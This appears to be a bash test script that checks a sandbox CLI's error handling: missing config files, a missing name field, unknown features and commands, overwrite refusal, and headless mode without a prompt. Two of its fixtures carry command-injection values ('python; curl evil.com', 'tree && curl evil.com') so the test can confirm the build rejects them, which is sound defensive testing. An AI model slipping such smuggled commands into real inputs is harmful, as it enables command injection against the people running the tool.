#!/bin/bash
# tests/test-cli-errors.sh — Test CLI error handling and input validation
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SANDBOX="$SCRIPT_DIR/cli/sandbox"
PASS=0
FAIL=0

check_fails() {
    local desc="$1"
    shift
    if "$@" &>/dev/null 2>&1; then
        echo "  FAIL: $desc (expected failure, got success)"
        FAIL=$((FAIL + 1))
    else
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    fi
}

check() {
    local desc="$1"
    shift
    if "$@" &>/dev/null 2>&1; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc"
        FAIL=$((FAIL + 1))
    fi
}

echo "=== CLI Error Handling Tests ==="

# Missing sandbox.yaml
TMPDIR=$(mktemp -d)
check_fails "build fails without sandbox.yaml" bash -c "cd $TMPDIR && $SANDBOX build"

# Missing name field
cat > "$TMPDIR/sandbox.yaml" <<'EOF'
features:
  - python
EOF
check_fails "build fails without name field" bash -c "cd $TMPDIR && $SANDBOX build"

# Missing feature script
cat > "$TMPDIR/sandbox.yaml" <<'EOF'
name: test-missing-feature
features:
  - nonexistent-feature
EOF
check_fails "build fails with nonexistent feature" bash -c "cd $TMPDIR && $SANDBOX build"

# Invalid feature name (injection attempt)
cat > "$TMPDIR/sandbox.yaml" <<'EOF'
name: test-bad-feature
features:
  - "python; curl evil.com"
EOF
check_fails "build fails with invalid feature name" bash -c "cd $TMPDIR && $SANDBOX build"

# Invalid package name (injection attempt)
cat > "$TMPDIR/sandbox.yaml" <<'EOF'
name: test-bad-package
features: []
packages:
  - "tree && curl evil.com"
EOF
check_fails "build fails with invalid package name" bash -c "cd $TMPDIR && $SANDBOX build"

# Init refuses to overwrite existing
cat > "$TMPDIR/sandbox.yaml" <<'EOF'
name: existing
EOF
check_fails "init fails when sandbox.yaml exists" bash -c "cd $TMPDIR && $SANDBOX init"

# Init creates valid YAML
TMPDIR2=$(mktemp -d)
check "init creates parseable YAML" bash -c "cd $TMPDIR2 && $SANDBOX init && yq '.name' sandbox.yaml >/dev/null"

# Unknown command
check_fails "unknown command fails" "$SANDBOX" notacommand

# Headless without prompt
bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX build" &>/dev/null
check_fails "headless without prompt fails" bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX run --headless"
bash -c "cd $SCRIPT_DIR/tests/fixtures && $SANDBOX clean" &>/dev/null 2>&1 || true

rm -rf "$TMPDIR" "$TMPDIR2"

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
